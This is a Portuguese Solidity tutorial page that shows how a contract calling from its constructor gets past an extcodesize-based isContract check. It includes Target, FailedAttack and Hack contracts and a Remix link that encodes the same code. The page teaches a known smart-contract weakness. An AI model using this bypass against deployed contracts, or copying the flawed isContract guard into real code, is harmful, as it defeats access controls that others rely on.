# Ignorar a Verificação do Tamanho do Contrato

</h4><a href="#vulnerability" id="vulnerability">Vulnerabilidade</a></h4>

Se o endereço for um contrato, o tamanho do código armazenado no endereço será maior que 0 certo?

Vamos ver como podemos criar um contrato com tamanho de código retornado `extcodesize` igual a 0.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Target {
    function isContract(address account) public view returns (bool) {
        // Esse método tem como base o extcodesize, que retorna 0 para contratos
        // em construção, desde que o código seja somente armazenado no
        // final da execução do constructor.
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    bool public pwned = false;

    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}

contract FailedAttack {
    // Tentativa de chamar Target.protected falhará,
    // Chamadas de bloco alvo do contrato
    function pwn(address _target) external {
        // Isso vai falhar
        Target(_target).protected();
    }
}

contract Hack {
    bool public isContract;
    address public addr;

    // Quando o contrato está sendo criado, o tamanho do código (extcodesize) é 0.
    // Isso vai ignorar a verificação do isContract()
    constructor(address _target) {
        isContract = Target(_target).isContract(address(this));
        addr = address(this);
        // Isso vai funcionar
        Target(_target).protected();
    }
}
```

## Teste no Remix

- [ContractSize.sol](https://remix.ethereum.org/#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yMDsKCmNvbnRyYWN0IFRhcmdldCB7CiAgICBmdW5jdGlvbiBpc0NvbnRyYWN0KGFkZHJlc3MgYWNjb3VudCkgcHVibGljIHZpZXcgcmV0dXJucyAoYm9vbCkgewogICAgICAgIC8vIEVzc2UgbWV0b2RvIHRlbSBjb21vIGJhc2UgbyBleHRjb2Rlc2l6ZSwgcXVlIHJldG9ybmEgMCBwYXJhIGNvbnRyYXRvcwogICAgICAgIC8vIGVtIGNvbnN0cnVjYW8sIGRlc2RlIHF1ZSBvIGNvZGlnbyBzZWphIHNvbWVudGUgYXJtYXplbmFkbyBubyAKICAgICAgICAvLyBmaW5hbCBkYSBleGVjdWNhbyBkbyBjb25zdHJ1Y3Rvci4KICAgICAgICB1aW50IHNpemU7CiAgICAgICAgYXNzZW1ibHkgewogICAgICAgICAgICBzaXplIDo9IGV4dGNvZGVzaXplKGFjY291bnQpCiAgICAgICAgfQogICAgICAgIHJldHVybiBzaXplID4gMDsKICAgIH0KCiAgICBib29sIHB1YmxpYyBwd25lZCA9IGZhbHNlOwoKICAgIGZ1bmN0aW9uIHByb3RlY3RlZCgpIGV4dGVybmFsIHsKICAgICAgICByZXF1aXJlKCFpc0NvbnRyYWN0KG1zZy5zZW5kZXIpLCAibm8gY29udHJhY3QgYWxsb3dlZCIpOwogICAgICAgIHB3bmVkID0gdHJ1ZTsKICAgIH0KfQoKY29udHJhY3QgRmFpbGVkQXR0YWNrIHsKICAgIC8vIFRlbnRhdGl2YSBkZSBjaGFtYXIgVGFyZ2V0LnByb3RlY3RlZCBmYWxoYXJhLAogICAgLy8gQ2hhbWFkYXMgZGUgYmxvY28gYWx2byBkbyBjb250cmF0bwogICAgZnVuY3Rpb24gcHduKGFkZHJlc3MgX3RhcmdldCkgZXh0ZXJuYWwgewogICAgICAgIC8vIElzc28gdmFpIGZhbGhhcgogICAgICAgIFRhcmdldChfdGFyZ2V0KS5wcm90ZWN0ZWQoKTsKICAgIH0KfQoKY29udHJhY3QgSGFjayB7CiAgICBib29sIHB1YmxpYyBpc0NvbnRyYWN0OwogICAgYWRkcmVzcyBwdWJsaWMgYWRkcjsKCiAgICAvLyBRdWFuZG8gbyBjb250cmF0byBlc3RhIHNlbmRvIGNyaWFkbywgbyB0YW1hbmhvIGRvIGNvZGlnbyAoZXh0Y29kZXNpemUpIGUgMC4KICAgIC8vIElzc28gdmFpIGlnbm9yYXIgYSB2ZXJpZmljYWNhbyBkbyBpc0NvbnRyYWN0KCkKICAgIGNvbnN0cnVjdG9yKGFkZHJlc3MgX3RhcmdldCkgewogICAgICAgIGlzQ29udHJhY3QgPSBUYXJnZXQoX3RhcmdldCkuaXNDb250cmFjdChhZGRyZXNzKHRoaXMpKTsKICAgICAgICBhZGRyID0gYWRkcmVzcyh0aGlzKTsKICAgICAgICAvLyBJc3NvIHZhaSBmdW5jaW9uYXIKICAgICAgICBUYXJnZXQoX3RhcmdldCkucHJvdGVjdGVkKCk7CiAgICB9Cn0=&version=soljson-v0.8.20+commit.a1b79de6.js)
